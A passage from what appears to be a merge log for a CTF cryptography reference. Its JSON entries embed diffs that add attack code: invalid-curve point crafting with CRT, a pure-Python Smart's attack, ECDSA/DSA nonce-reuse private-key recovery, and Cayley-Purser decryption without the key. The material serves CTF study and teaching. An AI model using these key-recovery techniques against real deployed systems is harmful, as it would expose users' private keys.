+    "delta": "--- \n\n+++ \n\n@@ -3,4 +3,19 @@\n\n - Check curve order for small factors\n - Pohlig-Hellman: solve DLP (Discrete Logarithm Problem) in small subgroups, combine with CRT (Chinese Remainder Theorem)\n+\n+```python\n+from sympy import factorint\n+# Pure-Python ECC basics via py_ecc / ecdsa (no Sage)\n+# For curve y^2 = x^3 + a*x + b over GF(p), use ecdsa library:\n+from ecdsa.ellipticcurve import CurveFp, Point\n+\n+curve = CurveFp(p, a, b)\n+G = Point(curve, Gx, Gy, order=None)  # set order if known\n+# Curve order via brute or Schoof (small p) or known value\n+# For large p, factor order with sympy if order is known:\n+# factors = factorint(order)\n+```\n+\n+<details><summary>Sage fallback (optional)</summary>\n \n ```python\n@@ -11,4 +26,6 @@\n\n ```\n \n+</details>\n+\n **Key insight:** When the curve order has small prime factors, Pohlig-Hellman decomposes the DLP into small subgroup problems solvable independently, then combines results with CRT. Always factor the curve order first -- if it is smooth (all small factors), the DLP is trivially solvable.\n "
+  },
+  {
+    "source": "ctf-crypto/ecc-attacks.md",
+    "heading": "## Invalid Curve Attacks",
+    "destination": "ctf-crypto/ecc-attacks.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -1,7 +1,179 @@\n\n ## Invalid Curve Attacks\n \n-If point validation is missing, send points on weaker curves. Craft points with small-order subgroups to leak secret key bits.\n+If point validation is missing, send points on weaker curves. Craft points with small-order subgroups to leak secret key bits. Point addition formulas depend on `a` but not `b` (short Weierstrass), so any `b'` yields a usable curve when validation is skipped.\n \n-**Key insight:** Invalid curve attacks exploit missing point-on-curve validation. Send crafted points that lie on a different curve with a small-order subgroup, and the server will compute scalar multiplication on the weak curve, leaking secret key bits modulo the small order.\n+**Key insight:** Invalid curve attacks exploit missing point-on-curve validation. Send crafted points that lie on a different curve with a small-order subgroup, and the server will compute scalar multiplication on the weak curve, leaking secret key bits modulo the small order. Always check `is_on_curve`: if attacker-supplied `(x,y)` passes without verifying `y^2 == x^3 + a*x + b (mod p)`, every `b' = y^2 - x^3 - a*x` is a candidate weak curve.\n+\n+### 5 Variant Table\n+\n+| # | Variant | Recognition | Exploit Sketch | Ref |\n+|---|---------|-------------|----------------|-----|\n+| 1 | **Classic same-`a` arbitrary `b`** small-order CRT | `a` unchanged, `b'` chosen; `factor(E.order())` has small prime `r`; server oracle returns `[k]P` or MAC/HMAC oracle | Mine `b'` until `N = #E_b'` is smooth; craft `P` of order `r` via `(N/r)*R`; query oracle to learn `k mod r` (try `\u00b1r` if x-only); CRT across many `r` | Biehl-Meyer-M\u00fcller 2000 / CVE-2015-0204 |\n+| 2 | **Codegate 2024 Babylogin** `a=-3` \u2192 `3q` trick | `a = -3` (NIST P-256 optimized); implementation uses same Jacobian formulas for every `b'`; KDF uses only `x([s]P)` | Search `E_{b'}: y^2 = x^3 -3x + b'` for order with factor `3*q` (small `q`); build point of order `3q` \u2192 probe `s mod q` via x-only HMAC verification; CRT with 3-modulus to resolve sign | Codegate 2024 Babylogin (affine.group) |\n+| 3 | **CUHK 2025 multi-query** `C2 - d*C1` via `C1=-P, C2=O \u21d2 dP` + singular fallback `y^2 = x^3` | Protocol returns `R = C2 - d*C1`; no `is_on_curve` on `C1,C2`; discriminant `\u0394 = 0` candidate accepted | Send `C1 = -P, C2 = O` so `R = dP` directly; choose singular `P=(1,1)` on `y^2=x^3` \u2192 `dP=(d^2,d^3)` \u21d2 `d = y/x`; generic case: multiple `b'` + CRT fallback | CUHK 2025 Trustworthy Person |\n+| 4 | **ISCTF 2025 fake generator off-curve** | Curve advertises `y^2 = x^3 + 3x + 27` but generator `G` is secp256k1 `G` (`a=0,b=7`) \u2192 `G` not on advertised curve; `b'` computed as `Gy^2 - Gx^3 - a*Gx` | Recompute `b' = Gy^2 - Gx^3 - a*Gx mod p`; solve ECDLP on actual curve `E_{a,b'}` (small `k` \u2192 brute/BSGS, else Pohlig-Hellman) | ISCTF 2025 (isc.tf) |\n+| 5 | **Montgomery/ladder twist** `x-only` lands on twist | Montgomery `Bv^2 = u^3 + Au^2 + u`; server uses x-only ladder (no `v` check); `f(u)/B` is non-residue \u2192 point on twist | If twist order `p+1-#E` (`= p+1+t`) is smooth/small factor, supply `u` on twist with small order `r`, learn `k mod r` via oracle (MAC/decryption/contributory check); CRT; mitigations: twist-secure curve, residue test | SafeCurves twist security / RFC 7748 |\n+\n+**Detection checklist:** (1) `is_on_curve` missing? (2) Does formula use `b`? (no \u2192 any `b'` works). (3) Twist order `p+1-#E` smooth? (`factor(p+1-t)`). (4) Discriminant `\u0394 = -16(4a^3+27b^2) == 0`? \u2192 singular. (5) Generator satisfies curve? (`y^2 != x^3+a*x+b` \u2192 fake generator).\n+\n+**Mining `b'` and crafting small-order points + CRT:**\n+\n+```python\n+from sympy import factorint\n+from sympy.ntheory.modular import crt\n+from ecdsa.ellipticcurve import CurveFp, Point\n+import random\n+\n+def is_smooth(n, bound=1_000_000):\n+    \"\"\"True if all prime factors of n <= bound.\"\"\"\n+    try:\n+        return max(factorint(n).keys()) <= bound\n+    except ValueError:  # n==1\n+        return True\n+\n+def _mod_sqrt(n, p):\n+    \"\"\"sqrt(n) mod odd prime p, or None if non-residue. sympy first, TS fallback.\"\"\"\n+    try:\n+        from sympy.ntheory import sqrt_mod\n+        r = sqrt_mod(n, p, all_roots=False)  # returns int root or None if non-residue\n+        return int(r) if r is not None else None\n+    except (ImportError, ValueError):\n+        pass\n+    # Fallback Tonelli-Shanks (no dependency).\n+    if n == 0:\n+        return 0\n+    if pow(n, (p - 1) // 2, p) != 1:\n+        return None\n+    if p % 4 == 3:\n+        return pow(n, (p + 1) // 4, p)\n+    q, s = p - 1, 0  # p-1 = q * 2^s with q odd\n+    while q % 2 == 0:\n+        q //= 2\n+        s += 1\n+    z = 2\n+    while pow(z, (p - 1) // 2, p) != p - 1:\n+        z += 1\n+    m, c, t, r = s, pow(z, q, p), pow(n, q, p), pow(n, (q + 1) // 2, p)\n+    while t != 1:\n+        i, tmp = 1, pow(t, 2, p)\n+        while tmp != 1:\n+            tmp = pow(tmp, 2, p)\n+            i += 1\n+        b = pow(c, 1 << (m - i - 1), p)\n+        m, c, t, r = i, pow(b, 2, p), (t * b * b) % p, (r * b) % p\n+    return r\n+\n+def point_of_order(E, N, r):\n+    \"\"\"Return random point of exact order r on curve E (curve order N, r|N).\"\"\"\n+    # E: ecdsa CurveFp object; need point sampling via brute x\n+    p = E.p()\n+    a = E.a()\n+    b = E.b()\n+    while True:\n+        x = random.randrange(p)\n+        rhs = (pow(x, 3, p) + a * x + b) % p\n+        if rhs == 0:\n+            y = 0\n+        else:\n+            # Legendre check: gmpy2.legendre (fast C-GMP) with pow Euler fallback\n+            try:\n+                import gmpy2\n+                if gmpy2.legendre(rhs, p) != 1:\n+                    continue\n+            except ImportError:\n+                if pow(rhs, (p - 1) // 2, p) != 1:  # Euler criterion: non-residue\n+                    continue\n+            y = _mod_sqrt(rhs, p)  # sympy sqrt_mod first, Tonelli-Shanks fallback\n+            if y is None:\n+                continue\n+        for yy in (y, p - y):\n+            try:\n+                P = Point(E, x, yy, order=None)\n+            except Exception:\n+                continue\n+            Q = P * (N // r)  # cofactor projection N/r * random point\n+            if Q != Point(E, None, None, order=None) and (Q * r) == Point(E, None, None, order=None):\n+                # verify exact order r (check no smaller divisor)\n+                is_exact = True\n+                for pr in factorint(r):\n+                    if (Q * (r // pr)) == Point(E, None, None, order=None):\n+                        is_exact = False\n+                        break\n+                if is_exact:\n+                    return Q\n+\n+def mine_b_prime(p, a, smooth_bound=5000, max_tries=5000):\n+    \"\"\"Find b' such that E: y^2=x^3+a*x+b' has smooth order with small prime factor.\"\"\"\n+    for _ in range(max_tries):\n+        b_prime = random.randrange(p)\n+        # Need curve order N = #E_b'; for small p brute, else use Sage E.order()\n+        # Demo: small p enumeration; for large p replace with Sage cardinality\n+        E = CurveFp(p, a, b_prime)\n+        # For demo with small p, compute order by brute enumeration\n+        # For real CTF with large p, use: E_sage = EllipticCurve(GF(p), [a, b_prime]); N = E_sage.order()\n+        N = None  # placeholder: set via Sage or Schoof for large p\n+        # Example check (fill N when known):\n+        if N is not None and N % 2 == 0:\n+            fac = factorint(N)\n+            small = [pr for pr in fac if pr < smooth_bound]\n+            if small:\n+                r = min(small)\n+                if max(fac.keys()) < smooth_bound * 10:\n+                    return b_prime, N, r\n+    return None\n+\n+def recover_via_crt(residues, moduli):\n+    \"\"\"Combine k mod r_i via CRT (pairwise coprime moduli).\"\"\"\n+    res = crt(moduli, residues)\n+    return int(res[0] % res[1]) if res is not None else None\n+\n+# Usage sketch (large p requires Sage for E.order()):\n+# b_prime, N, r = mine_b_prime(p, -3)  # Codegate a=-3 case\n+# E = CurveFp(p, -3, b_prime)\n+# P_r = point_of_order(E, N, r)  # N/r * random point of order r\n+# # Query oracle with P_r to learn k mod r (try both r and -r if x-only)\n+# # Repeat for many r_i, then k = recover_via_crt([k_mod_r1, ...], [r1, ...])\n+```\n+\n+<details><summary>Sage fallback (optional) -- robust for large p</summary>\n+\n+```python\n+from sage.all import GF, EllipticCurve\n+from sympy.ntheory.modular import crt\n+from sympy import factorint\n+\n+p = 2**256 - 2**224 + 2**192 + 2**96 - 1  # P-256 example\n+Fp = GF(p)\n+\n+def mine_b_prime_sage(a, bound=5000):\n+    while True:\n+        b_prime = Fp.random_element()\n+        E = EllipticCurve(Fp, [a, b_prime])\n+        N = E.order()\n+        fac = factorint(int(N))\n+        # smooth / small factor test\n+        if max(fac.keys()) < bound * 10 and any(pr < bound for pr in fac):\n+            # pick smallest prime factor as oracle modulus\n+            r = min(pr for pr in fac if pr < bound)\n+            return E, N, r\n+\n+def point_of_order_sage(E, r):\n+    N = E.order()\n+    while True:\n+        P = E.random_point()\n+        Q = (N // r) * P  # N/r * random point of order r\n+        if not Q.is_zero() and r * Q == E(0):\n+            # ensure exact order r\n+            if all((r // pr) * Q != E(0) for pr in factorint(r)):\n+                return Q\n+\n+# Example: a=-3 case (Codegate Babylogin)\n+E, N, r = mine_b_prime_sage(Fp(-3), bound=5000)\n+P = point_of_order_sage(E, r)\n+# Probe oracle with P (try r and -r for x-only KDF), collect residues, then:\n+# k, _ = crt(moduli, residues)\n+```\n+\n+</details>\n \n ---"
+  },
+  {
+    "source": "ctf-crypto/ecc-attacks.md",
+    "heading": "## Smart's Attack (Anomalous Curves)",
+    "destination": "ctf-crypto/ecc-attacks.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -5,7 +5,135 @@\n\n **Key insight:** Always check `E.order() == p` first. If the curve order equals the field prime, the ECDLP is solved instantly via p-adic lifting (Smart's attack). SageMath's `discrete_log` handles this automatically, but manual p-adic lift code is needed when the built-in method fails.\n \n-**Detection:** `E.order() == p` \u2014 always check this first!\n+**Detection:** `E.order() == p` -- always check this first!\n \n-**SageMath (automatic):**\n+**Pure-Python (py_ecc / ecdsa) for anomalous check:**\n+```python\n+from ecdsa.ellipticcurve import CurveFp, Point\n+from Crypto.Util.number import inverse\n+\n+curve = CurveFp(p, a, b)\n+# Anomalous check: compute curve order (for small p brute, else given)\n+# If order == p, use Smart's p-adic lift below without Sage\n+```\n+\n+**Pure-Python Smart's attack (anomalous, order == p):**\n+\n+Hensel lift is O(1) via Newton; brute `for dy in range(p)` is O(p) and fails for large p.\n+\n+```python\n+from Crypto.Util.number import inverse\n+# pow(..., -1, mod) exists Python 3.8+; Crypto.Util.number.inverse is fallback when not coprime or older runtime\n+\n+def lift_point(x, y, p, a, b):\n+    # lift (x,y) on y^2 = x^3 + a*x + b from mod p to mod p^2 via Hensel: y' = y - (y^2 - rhs)/(2y) mod p\n+    mod = p*p\n+    rhs = (pow(x,3,mod) + a*x + b) % mod\n+    try:\n+        inv2y = pow(2*y % p, -1, p)  # inverse mod p, then lift: could also use pow(2*y % mod, -1, mod) if gcd=1\n+    except ValueError:\n+        inv2y = inverse(2*y % p, p)  # fallback via Crypto.Util.number.inverse\n+    # Newton step: dy = (y*y - rhs)/p * inv(2y) mod p, then yc = y - dy*p\n+    # (y*y - rhs) is divisible by p because y^2 == rhs (mod p); integer divide before mod\n+    dy = ((y*y - rhs) // p) * inv2y % p\n+    yc = (y - dy * p) % mod  # single lift, two roots are yc and mod-yc (i.e. yc and (-yc % mod))\n+    # return both candidates or choose one; Satoh-Skjernaa-Taguchi uses lifted points pG,pQ\n+    return (x % mod, yc)\n+\n+def smart_attack(p, a, b, G, Q):\n+    # G, Q as (x,y) tuples over GF(p); p odd prime, anomalous => order == p\n+    # Note: for toy p<1e4 both brute `for dy in range(p): yc=y+dy*p` and Newton work, but Newton is O(1)\n+    mod = p * p\n+\n+    def ec_add(P, Q_, mod_):\n+        if P is None:\n+            return Q_\n+        if Q_ is None:\n+            return P\n+        x1, y1 = P; x2, y2 = Q_\n+        if x1 == x2 and (y1 + y2) % mod_ == 0:\n+            return None\n+        if P == Q_:\n+            try:\n+                inv = pow(2*y1 % mod_, -1, mod_)\n+            except ValueError:\n+                inv = inverse(2*y1 % mod_, mod_)\n+            lam = (3*x1*x1 + a) * inv % mod_\n+        else:\n+            try:\n+                inv = pow((x2 - x1) % mod_, -1, mod_)\n+            except ValueError:\n+                inv = inverse((x2 - x1) % mod_, mod_)\n+            lam = (y2 - y1) * inv % mod_\n+        x3 = (lam*lam - x1 - x2) % mod_\n+        y3 = (lam*(x1 - x3) - y1) % mod_\n+        return (x3, y3)\n+\n+    def ec_mul(P_, k, mod_):\n+        R = None; Q__ = P_\n+        while k:\n+            if k & 1:\n+                R = ec_add(R, Q__, mod_)\n+            Q__ = ec_add(Q__, Q__, mod_)\n+            k >>= 1\n+        return R\n+\n+    def psi(Pt, mod_):\n+        try:\n+            inv = pow(Pt[1] % mod_, -1, mod_)\n+        except ValueError:\n+            inv = inverse(Pt[1] % mod_, mod_)\n+        return (-Pt[0] * inv) % mod_\n+\n+    # Hensel lift G, Q to mod p^2 -- O(1) Newton step (not brute O(p))\n+    gx, gy = G\n+    qx, qy = Q\n+    gx_lift, gy_lift = lift_point(gx, gy, p, a, b)\n+    qx_lift, qy_lift = lift_point(qx, qy, p, a, b)\n+    # two y-roots per x: yc and mod-yc (negation); try both signs\n+    candidates_G = [(gx_lift, gy_lift), (gx_lift, (-gy_lift) % mod)]\n+    candidates_Q = [(qx_lift, qy_lift), (qx_lift, (-qy_lift) % mod)]\n+\n+    for g_lift in candidates_G:\n+        for q_lift in candidates_Q:\n+            try:\n+                pG = ec_mul(g_lift, p, mod)\n+                pQ = ec_mul(q_lift, p, mod)\n+                # Standard p-torsion test: p*P in kernel iff pP is None (identity) or y % p == 0\n+                # Bug was `if y%p==0: continue` (skipped torsion); correct is to require torsion\n+                if pG is None or pQ is None:\n+                    continue\n+                if pG[1] % p != 0 or pQ[1] % p != 0:\n+                    # not in kernel of reduction -> wrong lift sign, try other\n+                    continue\n+                psi_G = psi(pG, mod)\n+                psi_Q = psi(pQ, mod)\n+                # Satoh-Skjernaa-Taguchi: psi(pP) divisible by p; integer-divide after confirming\n+                if psi_G % p != 0 or psi_Q % p != 0:\n+                    continue\n+                val_G = (psi_G // p) % p\n+                val_Q = (psi_Q // p) % p\n+                if val_G == 0:\n+                    continue\n+                try:\n+                    inv_val = pow(val_G, -1, p)\n+                except ValueError:\n+                    inv_val = inverse(val_G, p)\n+                secret = (val_Q * inv_val) % p\n+\n+                def verify(k):\n+                    return ec_mul(G, k, p) == Q\n+\n+                if verify(secret):\n+                    return secret\n+                # sign flip can give p-secret if we chose opposite y-root\n+                if verify((-secret) % p):\n+                    return (-secret) % p\n+            except Exception:\n+                continue\n+    return None\n+```\n+\n+<details><summary>Sage fallback (optional)</summary>\n+\n ```python\n E = EllipticCurve(GF(p), [a, b])\n@@ -44,5 +172,7 @@\n\n ```\n \n-**Multi-layer decryption after key recovery:** Challenge may wrap flag in AES-CBC + DES-CBC or similar \u2014 just busywork once the ECC key is recovered. Derive keys with SHA-256 of shared secret.\n+</details>\n+\n+**Multi-layer decryption after key recovery:** Challenge may wrap flag in AES-CBC + DES-CBC or similar -- just busywork once the ECC key is recovered. Derive keys with SHA-256 of shared secret.\n \n ---"
+  },
+  {
+    "source": "ctf-crypto/ecc-attacks.md",
+    "heading": "## HNP Cross-Link: ECDSA Truncated Nonces \u2192 Lattice (8-sig example)",
+    "destination": "ctf-crypto/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-crypto/ecc-attacks.md",
+    "heading": "## MOV Attack (Weil Pairing, embedding degree k\u22646)",
+    "destination": "ctf-crypto/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-crypto/ecc-attacks.md",
+    "heading": "## Twist Security & Twist Attacks",
+    "destination": "ctf-crypto/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-crypto/ecc-attacks.md",
+    "heading": "## GLV / CM Endomorphism Leakage (d=-3/-4)",
+    "destination": "ctf-crypto/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-crypto/ecc-attacks.md",
+    "heading": "## ECC Fault Injection",
+    "destination": "ctf-crypto/ecc-attacks.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -5,4 +5,5 @@\n\n **Attack:** Compare correct vs faulty ciphertext, recover key bit-by-bit:\n ```python\n+# Bit flip simulation: gmpy2.bit_flip(scalar, bit_i) or scalar ^ (1 << bit_i)\n # For each key bit position:\n # If fault at bit i changes output -> key bit i affects computation"
+  },
+  {
+    "source": "ctf-crypto/ecc-attacks.md",
+    "heading": "## Clock Group DLP via Pohlig-Hellman (LACTF 2026)",
+    "destination": "ctf-crypto/ecc-attacks.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -30,4 +30,5 @@\n\n # Given points on the curve, p divides (x^2 + y^2 - 1)\n from math import gcd\n+from functools import reduce\n vals = [x**2 + y**2 - 1 for x, y in known_points]\n p = reduce(gcd, vals)"
+  },
+  {
+    "source": "ctf-crypto/ecc-attacks.md",
+    "heading": "## ECDSA Nonce Reuse (BearCatCTF 2026)",
+    "destination": "ctf-crypto/ecc-attacks.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -6,4 +6,5 @@\n\n ```python\n from hashlib import sha256\n+from Crypto.Util.number import inverse\n \n # Two signatures (r, s1) and (r, s2) with same r \u2192 same nonce k\n@@ -12,4 +13,5 @@\n\n n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141  # secp256k1 order\n \n+# pow(a, -1, n) is stdlib Python 3.8+; Crypto.Util.number.inverse is fallback\n k = ((h1 - h2) * pow(s1 - s2, -1, n)) % n\n d = ((s1 * k - h1) * pow(r, -1, n)) % n  # private key"
+  },
+  {
+    "source": "ctf-crypto/ecc-attacks.md",
+    "heading": "## DSA Nonce Reuse for Private Key Recovery (VolgaCTF 2016)",
+    "destination": "ctf-crypto/ecc-attacks.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -4,5 +4,8 @@\n\n \n ```python\n+from Crypto.Util.number import inverse\n+\n # Two signatures (r, s1, H(m1)) and (r, s2, H(m2)) with same r\n+# pow(..., -1, q) is stdlib; Crypto.Util.number.inverse is fallback\n k = ((H_m1 - H_m2) * pow(s1 - s2, -1, q)) % q\n x = ((s1 * k - H_m1) * pow(r, -1, q)) % q  # private key"
+  },
+  {
+    "source": "ctf-crypto/ecc-attacks.md",
+    "heading": "## DSA Limited k-Value Brute Force (ASIS CTF Finals 2016)",
+    "destination": "ctf-crypto/ecc-attacks.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -18,5 +18,5 @@\n\n             if den == 0:\n                 continue\n-            x = (num * inverse(den, q)) % q\n+            x = (num * pow(den, -1, q)) % q  # stdlib pow; Crypto.Util.number.inverse fallback\n             # Verify: check if r1 == (g^k1 mod p) mod q\n             if pow(g, k1, p) % q == r1:"
+  },
+  {
+    "source": "ctf-crypto/ecc-attacks.md",
+    "heading": "## DSA Key Recovery via MD5 Collision on k-Generation (CONFidence CTF 2017)",
+    "destination": "ctf-crypto/ecc-attacks.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -16,7 +16,9 @@\n\n sig2 = sign(msg2, counter2)  # uses MD5(prefix + counter2) = same hash!\n \n-# Standard DSA nonce reuse recovery\n-k = (hash1 - hash2) * modinv(sig1.s - sig2.s, q) % q\n-private_key = (sig1.s * k - hash1) * modinv(sig1.r, q) % q\n+from Crypto.Util.number import inverse\n+\n+# Standard DSA nonce reuse recovery (stdlib pow or Crypto.Util.number.inverse)\n+k = (hash1 - hash2) * pow(sig1.s - sig2.s, -1, q) % q\n+private_key = (sig1.s * k - hash1) * pow(sig1.r, -1, q) % q\n ```\n "
+  },
+  {
+    "source": "ctf-crypto/ecc-attacks.md",
+    "heading": "## Ed25519 Same-Nonce Key Recovery (hxp 2018)",
+    "destination": "ctf-crypto/ecc-attacks.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -4,11 +4,14 @@\n\n \n ```python\n+from Crypto.Util.number import inverse\n+\n L = 2**252 + 27742317777372353535851937790883648493\n+# pow(..., -1, L) is stdlib; Crypto.Util.number.inverse is fallback\n a = (S1 - S2) * pow(h1 - h2, -1, L) % L   # recovered scalar\n ```\n \n-**Key insight:** Ed25519 is deterministic, but any implementation bug that desyncs `(r, k)` from `(H(privkey, msg))` produces classical nonce-reuse. Check implementations that sign across key rotations \u2014 the scalar often survives rekey.\n+**Key insight:** Ed25519 is deterministic, but any implementation bug that desyncs `(r, k)` from `(H(privkey, msg))` produces classical nonce-reuse. Check implementations that sign across key rotations -- the scalar often survives rekey.\n \n-**References:** hxp CTF 2018 \u2014 writeup 12561\n+**References:** hxp CTF 2018 -- writeup 12561\n \n ---"
+  },
+  {
+    "source": "ctf-crypto/ecc-attacks.md",
+    "heading": "## Singular Curve ECDLP to Additive/Multiplicative Group (hxp 2018)",
+    "destination": "ctf-crypto/ecc-attacks.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -1,5 +1,5 @@\n\n ## Singular Curve ECDLP to Additive/Multiplicative Group (hxp 2018)\n \n-**Pattern:** Challenge publishes an \"elliptic curve\" that is actually singular \u2014 its discriminant is zero. Compute the singularity by finding the double root of `f(x) = x^3 + ax + b`. Map the curve to either the additive group `(GF(p), +)` (cusp) or the multiplicative group `GF(p)^*` (node) where DLP is easy.\n+**Pattern:** Challenge publishes an \"elliptic curve\" that is actually singular -- its discriminant is zero. Compute the singularity by finding the double root of `f(x) = x^3 + ax + b`. Map the curve to either the additive group `(GF(p), +)` (cusp) or the multiplicative group `GF(p)^*` (node) where DLP is easy.\n \n ```python\n@@ -12,5 +12,8 @@\n\n ```\n \n-**Key insight:** Discriminant `-16(4a^3 + 27b^2)` zero means singular. Singular curves are either cusps (map to `(GF(p), +)`) or nodes (map to `GF(p)^*`) \u2014 both with polynomial-time DLP.\n+**Key insight:** Discriminant `-16(4a^3 + 27b^2)` zero means singular. Singular curves are either cusps (map to `(GF(p), +)`) or nodes (map to `GF(p)^*`) -- both with polynomial-time DLP.\n \n-**References:** hxp CTF 2018 \u2014 writeup 12563\n+**References:** hxp CTF 2018 -- writeup 12563\n+\n+---\n+"
+  },
+  {
+    "source": "ctf-crypto/ecc-attacks.md",
+    "heading": "## X25519 Low-Order Points + All-Zero Check (RFC 7748)",
+    "destination": "ctf-crypto/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-crypto/exotic-crypto-2.md",
+    "heading": "## Cayley-Purser Decryption Without Private Key (TJCTF 2018)",
+    "destination": "ctf-crypto/exotic-crypto-2.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -4,4 +4,30 @@\n\n \n **Exploit:** Any matrix `H` commuting with `gamma` decrypts correctly, and the Cayley-Hamilton theorem lets you build one entirely from public values \u2014 no need to recover `r`.\n+\n+```python\n+from sympy import Matrix\n+import operator\n+\n+# Given public alpha, beta, gamma, epsilon, mu (ciphertext) as 2x2 Matrices over GF(p) (sympy/numpy)\n+def mat_inv(M, mod):\n+    det = int(M.det() % mod)\n+    inv_det = pow(det, -1, mod)\n+    adj = Matrix([[M[1,1], -M[0,1]], [-M[1,0], M[0,0]]])\n+    return (inv_det * adj) % mod\n+\n+# Given public alpha, beta, gamma, epsilon, mu (ciphertext)\n+invalpha = mat_inv(alpha, p)\n+# Recover scaling entry h via elementwise division mod p\n+h_elems = (invalpha * gamma - gamma * beta) % p\n+h_denom = (beta - invalpha) % p\n+# Elementwise division mod p\n+h = Matrix([[ (h_elems[i,j] * pow(int(h_denom[i,j]), -1, p)) % p for j in range(2)] for i in range(2)])\n+\n+H = (h[0,0] * Matrix.eye(2) + gamma) % p\n+H_inv = mat_inv(H, p)\n+plaintext = (H_inv * epsilon * H) * mu * (H_inv * epsilon * H) % p\n+```\n+\n+<details><summary>Sage fallback (optional)</summary>\n \n ```python\n@@ -20,4 +46,6 @@\n\n ```\n \n+</details>\n+\n **Key insight:** Any commuting matrix works as the decryption key. Cayley-Hamilton guarantees that `H = c1 * I + c2 * gamma` commutes with `gamma`, and the needed scalar `c1` can be read off by comparing entries of `alpha^(-1) * gamma` against `gamma * beta`. Always check whether \"private key\" operations can be replaced by a commutation-equivalent derived from public data.\n "
+  },
+  {
+    "source": "ctf-crypto/exotic-crypto-2.md",
+    "heading": "## Polynomial Coefficient Recovery via Vandermonde Linear System (X-MAS 2018)",
+    "destination": "ctf-crypto/exotic-crypto-2.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -2,4 +2,16 @@\n\n \n **Pattern:** Oracle evaluates a hidden degree-`n` polynomial at `n+1` points. Build the Vandermonde matrix of evaluation inputs and solve the linear system for coefficients; recovered polynomial reveals the secret constants.\n+\n+```python\n+from sympy import Matrix\n+pts = [(x_i, f(x_i)) for x_i in range(degree+1)]\n+A = Matrix([[pow(xi, k, p) if 'p' in globals() else xi**k for k in range(degree+1)] for xi, _ in pts])\n+b = Matrix([yi for _, yi in pts])\n+# Solve A * coeffs = b over field (mod p if p defined, else QQ)\n+coeffs = A.gauss_jordan_solve(b) if hasattr(A, 'gauss_jordan_solve') else A.LUsolve(b)\n+# For GF(p): use rref mod p helper as in modern-ciphers-3\n+```\n+\n+<details><summary>Sage fallback (optional)</summary>\n \n ```python\n@@ -11,4 +23,6 @@\n\n ```\n \n+</details>\n+\n **Key insight:** Any secret polynomial, Shamir-style sharing, or \"interpolate a curve\" oracle falls to a Vandermonde solve with `degree + 1` points. Sage's `solve_right` handles huge degrees.\n "
+  },
+  {
+    "source": "ctf-crypto/exotic-crypto.md",
+    "heading": "## Table of Contents",
+    "destination": "ctf-crypto/exotic-crypto.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -10,4 +10,6 @@\n\n - [Icosahedral Symmetry Group Cipher (BSidesSF 2026)](#icosahedral-symmetry-group-cipher-bsidessf-2026)\n - [Goldwasser-Micali Ciphertext Replication Oracle (BSidesSF 2026)](#goldwasser-micali-ciphertext-replication-oracle-bsidessf-2026)\n+- [ForkAES-5-2-2 Reflective Differential (BSidesSF 2026)](#forkaes-5-2-2-reflective-differential-bsidessf-2026)\n+- [GhostBlood \u2014 Faulty ChaCha ARX Rotate (BSidesSF 2026)](#ghostblood--faulty-chacha-arx-rotate-bsidessf-2026)\n \n ---"
+  },
+  {
+    "source": "ctf-crypto/exotic-crypto.md",
+    "heading": "## Goldwasser-Micali Ciphertext Replication Oracle (BSidesSF 2026)",
+    "destination": "ctf-crypto/exotic-crypto.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -57,4 +57,4 @@\n\n **References:** BSidesSF 2026 \"kproof\"\n \n+---\n \n-See [exotic-crypto-2.md](exotic-crypto-2.md) for 2017+ era exotic crypto attacks (BB-84, ElGamal variants, Paillier oracles, Cayley-Purser, BIP39, Asmuth-Bloom, Rabin polynomial, Vandermonde)."
+  },
+  {
+    "source": "ctf-crypto/exotic-crypto.md",
+    "heading": "## ForkAES-5-2-2 Reflective Differential (BSidesSF 2026)",
+    "destination": "ctf-crypto/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
